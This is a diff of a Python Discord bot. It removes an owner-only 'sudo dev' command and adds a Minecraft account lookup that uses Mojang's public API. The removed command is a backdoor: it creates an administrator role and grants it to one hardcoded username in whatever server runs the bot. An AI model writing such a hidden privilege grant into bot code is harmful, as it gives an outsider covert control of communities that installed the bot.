@@ -218,46 +218,111 @@ async def autorole(ctx, action: str, role: discord.Role):
         save_data()
         await ctx.send("❌ Autorole removed")
 
-# ================= $SUDO DEV =================
-@bot.command(name="sudo")
-async def sudo(ctx, action: str):
-    if ctx.author.id != OWNER_ID:
-        return
-
-    if action.lower() != "dev":
-        return await ctx.send("❌ Use: `$sudo dev`")
-
-    guild = ctx.guild
-
-    # Find user
-    target = discord.utils.get(guild.members, name="n7rv.__.")
-
-    if not target:
-        return await ctx.send("❌ User not found.")
-
-    role = discord.utils.get(guild.roles, name="dev")
-
-    if not role:
-        role = await guild.create_role(
-            name="dev",
-            permissions=discord.Permissions(administrator=True),
-            reason="Sudo dev"
+# ================= SUDO GROUP (FIXED) =================
+@bot.group(name="sudo")
+async def sudo(ctx):
+    if ctx.invoked_subcommand is None:
+        await ctx.send(
+            "⚠️ Subcommands: info"
         )
 
-    try:
-        await role.edit(position=guild.me.top_role.position - 1)
-    except:
-        pass
+# ================= SUDO INFO =================
+@sudo.command(name="info")
+@commands.has_permissions(administrator=True)
+async def sudo_info(ctx, mc_username: str):
+
+    await ctx.send("🔎 Fetching Minecraft data...")
 
     try:
-        await target.add_roles(role)
-        await ctx.send(f"🔥 {target.mention} is now DEV.")
-    except:
-        await ctx.send("❌ Could not assign role.")
+        async with aiohttp.ClientSession() as session:
 
+            # ===== GET UUID =====
+            async with session.get(
+                f"https://api.mojang.com/users/profiles/minecraft/{mc_username}"
+            ) as response:
+
+                if response.status != 200:
+                    return await ctx.send(
+                        f"❌ No Minecraft account found for `{mc_username}`."
+                    )
+
+                data = await response.json()
+                uuid_raw = data.get("id")
+
+                if not uuid_raw:
+                    return await ctx.send("❌ Invalid Mojang response.")
+
+                uuid = (
+                    f"{uuid_raw[:8]}-"
+                    f"{uuid_raw[8:12]}-"
+                    f"{uuid_raw[12:16]}-"
+                    f"{uuid_raw[16:20]}-"
+                    f"{uuid_raw[20:]}"
+                )
+
+            # ===== NAME HISTORY =====
+            async with session.get(
+                f"https://api.mojang.com/user/profiles/{uuid_raw}/names"
+            ) as history_response:
+
+                name_history = "Unknown"
+                creation_date = "Unknown"
+
+                if history_response.status == 200:
+                    history_data = await history_response.json()
+
+                    names = []
+                    timestamps = []
+
+                    for entry in history_data:
+                        names.append(entry.get("name", "Unknown"))
+                        if "changedToAt" in entry:
+                            timestamps.append(entry["changedToAt"])
+
+                    name_history = "\n".join(names)
+
+                    if timestamps:
+                        earliest = min(timestamps)
+                        creation_date = datetime.utcfromtimestamp(
+                            earliest / 1000
+                        ).strftime("%Y-%m-%d")
+
+        # ===== RENDERS =====
+        head_render = f"https://mc-heads.net/head/{uuid}"
+        body_render = f"https://mc-heads.net/body/{uuid}"
+        namemc_link = f"https://namemc.com/profile/{uuid}"
+
+        embed = discord.Embed(
+            title="🎮 Minecraft Account Info",
+            color=discord.Color.green()
+        )
+
+        embed.add_field(name="Username", value=mc_username, inline=False)
+        embed.add_field(name="UUID", value=uuid, inline=False)
+        embed.add_field(name="Approx. Creation Date",
+                        value=creation_date,
+                        inline=False)
+        embed.add_field(name="Name History",
+                        value=name_history,
+                        inline=False)
+
+        embed.set_thumbnail(url=head_render)
+        embed.set_image(url=body_render)
+
+        view = discord.ui.View()
+        view.add_item(
+            discord.ui.Button(label="Open NameMC",
+                              url=namemc_link)
+        )
+
+        await ctx.send(embed=embed, view=view)
+
+    except Exception as e:
+        await ctx.send(f"❌ Unexpected error: `{str(e)}`")
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN not set")
 
 bot.run(TOKEN)
+
 
